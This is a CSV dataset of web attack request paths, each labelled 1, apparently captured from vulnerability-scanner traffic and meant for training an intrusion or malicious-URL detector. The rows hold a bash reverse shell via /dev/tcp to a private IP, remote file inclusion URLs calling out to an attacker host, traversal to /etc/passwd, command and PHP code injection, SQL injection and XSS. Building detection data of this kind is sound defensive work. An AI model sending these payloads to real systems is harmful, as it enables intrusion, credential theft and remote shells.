payload,label
/projects/1/repository/annotate?rev=`0<&186-;exec 186<>/dev/tcp/192.168.202.118/17246;sh <&186 >&186 2>&186`,1
/ka'roo/,1
"<script>document.cookie=""testrluj=1420;""</script>",1
/javascript/maestro.exe,1
/top.php?stuff='&sleep 9 #,1
/cacti/setcookie.php?u=../../../../../../../../../../../../etc/passwd\x00&plugin=pblang_mult_flaws.nasl,1
/javascript/vendors.exe,1
/scripts/tree.php,1
/subscriptions.yml,1
/scripts/4rzefq7dsowk.pl,1
"/help.php?q=""\x0auname\x09>q72938489\x09#",1
/pwcgi/smpwservicescgi.exe?target=http://www.nessus.org,1
/javascript/bfc.exe,1
/cgi-bin/rss.php?blogid=1&profile=../../config/config.properties.php\x00,1
/cacti/include/doc/get_image.php?lang=en&img=../../../../../../../../../../etc/passwd,1
/snmx-cgi/fxm.exe,1
/descriptious/,1
"/main.php?stuff=""ping\x0b-w\x0b11000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b",1
/manager/lang/index.php?file=/etc/passwd,1
/cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.ini\x00board=board_1,1
/o35zot2r.cfm?<script>cross_site_scripting.nasl</script>,1
/scripts/inc/pipe.php?hcl_path=http://xxxxxx./,1
/prescription-ultram/,1
"/t7tm4m0b.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/phpmyadmin/index.php?op=default&date=200607' union select 1,1265182078,1,1,1,1,1,1,1,1--&blogid=1",1
"/en-us/33y9gcqq.jspa?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
"/ao22ww7y.cfm?<script>document.cookie=""testqppc=8767;""</script>",1
/top.php?stuff=&ver\x0b>q21316317&rem\x0b,1
"/6dlc2zm9.asp?<script>document.cookie=""testqpux=4016;""</script>",1
/scripts_help/,1
/feedsplitter.php?format=../../../../../../../../../../etc/passwd\x00&debug=1,1
"/iajtej82.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/main.php?logout=""|ping\x0c-w\x0c8000\x0c-n\x0c1\x0c1.2.3.4|rem\x0c",1
/javascript/.passwd.db,1
"/rpxyx07v.do?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
/o35zot2r.exe?<script>cross_site_scripting.nasl</script>,1
/scriptsfaq.php?skin=../../admin/manager&tplpath=admin,1
"/ygkjkngd.cfc?<script>document.cookie=""testnago=4518;""</script>",1
/unix-scripts/,1
"/d44uk9h2.exe?<meta http-equiv=set-cookie content=""testmybc=2088"">",1
/top.php?stuff=&rm;q25243259&rem;,1
"/<meta http-equiv=set-cookie content=""testqppc=8767"">",1
/cgi-bin/sawmill6cl.exe?ho+{complete_version},1
/scriptaculous/,1
"/t7tm4m0b.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/recorder.exe,1
/scripts/contenido/classes/class.inuse.php?cfg[path][contenido]=/etc/passwd\x00,1
/scripts/rx9ysf2iwv4j.cfm,1
/cgi-bin/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>,1
"/scs86g1p.aspx?<meta http-equiv=set-cookie content=""testquyx=2820"">",1
"/bxnyrhmh.dll?<meta http-equiv=set-cookie content=""testmjct=1867"">",1
/examples/jsp/colors/index.php?show=../../../../../../../../../../../etc/passwd\x00,1
"/zuihld5m.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/l13b77e5.nsf?<script>document.cookie=""testjvvf=7721;""</script>",1
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/cgeqvnsxdv.sh'); function v,1
"/cgi-binsearch-results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/top.php?stuff=';uname >q38627655 #,1
/examples/jsp/sessions/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
"/top.php?stuff=""&rm\x0cq55426988&rem\x0c",1
/javascript/traces.exe,1
"/0qhcnefz.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/xampp/phonebook.php?lastname=',acunetix())/*&firstname=1",1
"/iv5vkgam.php?<meta http-equiv=set-cookie content=""testfosd=94"">",1
"/igtf0zon.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/en-us/oie504mr.dll?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
/bzuf9ozq.kspx?<script>cross_site_scripting.nasl</script>,1
/recordings/module.php?module=osticket&file=../../../../../../../../../../../etc/passwd,1
"/help.php?q=""&ver&rem ",1
"/169okeyj.html?<meta http-equiv=set-cookie content=""testxeoi=3573"">",1
/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>,1
"/administrator/gallery/navigation.php?directory=\""<script>alert(document.cookie)</script>",1
/en-us/h5sc3gxy.nsf?<script>cross_site_scripting.nasl</script>,1
/cacti/atomicboard/index.php?location=../../../../../../../../../../../../../../../etc/passwd,1
"/en-us/dda2qr7j.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/num/pfdispaly.cgi?../../../../../../etc/passwd,1
/smpwservicescgi.exe,1
/javascript/feeds.exe,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/pcousamoyu""",1
/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd,1
"/i7prbs22.cgi?<meta http-equiv=set-cookie content=""testjnre=7328"">",1
"/b5xdqgz2.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/checkbox/admin/admin.php?sid=',1
"/nmw0do67.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/_xuzlr7swn95.php3,1
"/ghswfouu.cfc?<script>document.cookie=""testsqmm=5713;""</script>",1
"/cgi-binsearch_results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/examples/jsp/checkbox/rot13sj.cgi?/etc/passwd,1
/scripts/gwweb.exe?help=bad-request,1
/cgi/query?mss=../config,1
/t7tm4m0b.nsf?<script>cross_site_scripting.nasl</script>,1
/superduperdescription/,1
/manager/library/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/javascript/bank.exe,1
"/3hlysl2x.cfc?<script>document.cookie=""testgjbe=8505;""</script>",1
/iktok2bw.cfc?<script>cross_site_scripting.nasl</script>,1
/cacti/cgiforum.pl?thesection=../../../../../../../../etc/passwd\x00,1
/htbin/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
/examples/jsp/sessions/help.php?section='qualiteam_xcart_sql_xss.nasl,1
/606wkcop.php?<script>cross_site_scripting.nasl</script>,1
/examples/servlets/servlet/admin/admin.php?sid=0',1
/cgi-bin/index.php?src=1&_common=1&time=1331919011&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00,1
/include/default_header.php?script_path=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
"/server.pt?open=space&name="";}</script><script>alert('plumtree_name_xss.nasl')</script>",1
"/7u1pb2xi.html?<meta http-equiv=set-cookie content=""testlwwz=718"">",1
/examples/servlets/servlet/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor,1
/javascript/foo.exe,1
/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904208')</script>,1
/fcgi-bin/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
/eg2u8pbv.htm?<script>cross_site_scripting.nasl</script>,1
"/help.php?q=""&del\x0cq93118475&rem\x0c",1
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+555+/tmp/zffcwqffhn0;'); function v,1
/javascript/loading.exe,1
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908785&lang_crm=../../vtigerservice.php\x00,1
/cgi-bin/www/delivery/ac.php?bannerid=-1331904183+or+1=1+--+';passthru(base64_decode($_server[http_nessus_0oywsnwb]));die;/*,1
/cwmail.exe,1
/main.php?stuff=;del q92696358 #,1
/scripts/ws_ftp.ini,1
"/x2gyorli.do?<script>document.cookie=""testwhac=3130;""</script>",1
/9o6g5vkn.cfc?<script>cross_site_scripting.nasl</script>,1
"/templates/admin/login_form.php?msg_login=<script>alert(""force_xss"")</script>",1
/scripts/sendcard.php?view=1&id='sendcard_sql.nasl,1
"/msadm/domain/index.php3?account_name=\""><script>alert('vulnerable')</script>",1
/examples/jsp/cal/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904365&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
"/jw64yq8u.aspx?<meta http-equiv=set-cookie content=""testylfu=1313"">",1
"/zv8tv7h8.php3?<meta http-equiv=set-cookie content=""testcqwz=9752"">",1
/javascript/.htaccess///skipfish.invalid/;?,1
/index.php?_language=../../../../../../../../../../etc/passwd\x00,1
"/m4kkjf8l.dll?<meta http-equiv=set-cookie content=""testyglc=8988"">",1
/main.php?logout=;rm\x09q14218261\x09#,1
/scripts/?cmd=config,1
/cacti/simple/view_page?mv_arg=|cat /etc/passwd|,1
../../../../../../../../../../etc/passw*,1
/cgi-bin/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|,1
/en-us/account/whois.cgi?action=load&whois=;id,1
/cgi-bin/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332009305',null,null,null,null --",1
fi?/etc/passwd,1
"/top.php?stuff=1 '"" -- ",1
/en-us/<script>cross_site_scripting.nasl</script>.php,1
/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,1
/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.118:8080/zz5thkvtmlgl?\x00,1
/cgi-bin/index.php?id=_pb9wansu9',1
/cgi-bin/dataservice.asmx/authuser?username='nessus1331919210&password=nasl&needcompress=0,1
"/sys/code/box.inc.php?config[""sipssys""]=http://192.168.202.118:8080/moclyxlwqyfjnp?",1
/recordings/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00,1
/main.php?logout='&uname >q16695623 #,1
/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//,1
/javascript/.passwd.py,1
"/cgi-bin/webappmon.exe?ins=nowait&act=natping&sel=""255.255.255.255 & id&""",1
/help.php?q=\x0auname\x09>q27637243\x09#,1
/javascript/mark.exe,1
"/bxnyrhmh.php?<script>document.cookie=""testmjct=1867;""</script>",1
/news.php?scriptpath=http://192.168.202.118:8080/2aibfaczmac8??,1
/examples/jsp/checkbox/faxsurvey?cat /etc/passwd,1
"/0z575z74.do?<meta http-equiv=set-cookie content=""testuhsv=9753"">",1
/s7qus4g3.x?<script>cross_site_scripting.nasl</script>,1
/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd\x00,1
"/main.php?logout=""rm;q97754931&rem;",1
"/qb2xy9aw.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/ihd231-xss/,1
/examples/jsp/colors/detail.asp?nchannel='1,1
"/ddoworrl.cfc?<script>document.cookie=""testvlau=8517;""</script>",1
"/en-us/s7qus4g3.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/hrttz9fj.php3?<meta http-equiv=set-cookie content=""testtbjy=7334"">",1
/javascript/developers.exe,1
/javascript/bio.exe,1
/phpmyadmin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
"/b5xdqgz2.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/phpmyadmin/documentation.html?phpmyadmin=""><img src=1 onerror=javascript:alert(205)>",1
/nuh3zirz.kspx?<script>cross_site_scripting.nasl</script>,1
/n9xlumt5.pl?<script>cross_site_scripting.nasl</script>,1
"/fmnveedu.htm?<script>document.cookie=""testgfbr=7014;""</script>",1
/daddy's little princess - scene 2/,1
//<body><script src=http://www.example.com/test?rnd=q91324775></script>,1
/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://cirt.net/rfiinc.txt?,1
"/jdx255ea.fts?<meta http-equiv=set-cookie content=""testziyq=5055"">",1
/examples/servlets/servlet/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00,1
"/examples/jsp/error/wordtrans.php?command=show_desc&advanced=1"";id; true """,1
/scripts/bpk_bsfe_4vq.html,1
/scripts/cmslogin.aspx,1
/cgi-915/sensepost.exe?/c+dir,1
/cgi-local/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
/opensiteadmin/scripts/classes/fieldmanager.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00,1
/<script>cross_site_scripting.nasl</script>.exe,1
/javascript/purchasing.exe,1
/piranha/secure/passwd.php3,1
/help.php?q=ver\x09>q72339979&rem\x09,1
"/main.php?stuff=""\x0auname #",1
"/ap58k3ci.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/dda2qr7j.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908736,1948616015 -- ",1
"/ygkjkngd.cgi?<meta http-equiv=set-cookie content=""testnago=4518"">",1
/examples/jsp/colors/search.cgi?..\..\..\..\..\..\winnt\win.ini,1
"/top.php?stuff=""\x0arm\x09q52122221\x09#",1
"/um7xpn15.fts?<meta http-equiv=set-cookie content=""testotoy=6142"">",1
"/en-us/fo564rei.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/admin/news.admin.php?path_to_script=http://192.168.202.96:8080/whmch8ftkt7kv??&cmd=ls,1
/javascript/to.exe,1
"/m4kkjf8l.exe?<meta http-equiv=set-cookie content=""testyglc=8988"">",1
/scripts/gdxlwjnlsr6i.php3,1
/eei78ore.cgi?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/num/index.php?page=/etc/passwd\x00,1
"/5qnlm5z2.dll?<meta http-equiv=set-cookie content=""testsixi=8451"">",1
/fcgi-bin/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
/scripts/kfzqb5x87lvq.php3,1
"/b4vng02k.asp?<script>document.cookie=""testtrlh=3672;""</script>",1
"/scripts/item.fts?href=""><script>alert(""ftgate_44002.nasl"")</script>;",1
/scripts/test11.asp,1
"/main.php?stuff=""\x0adel\x09q74494385\x09#",1
"/?<script>document.cookie=""testwldz=3506;""</script>",1
/en-us/account/index.php?id=',1
/cgi-915/pfdisplay.cgi?'\x0a/bin/cat /etc/passwd|',1
/phpmyadmin/htsearch?exclude=`/etc/passwd`,1
"/fc9t54l7.jsp?<meta http-equiv=set-cookie content=""testggad=2000"">",1
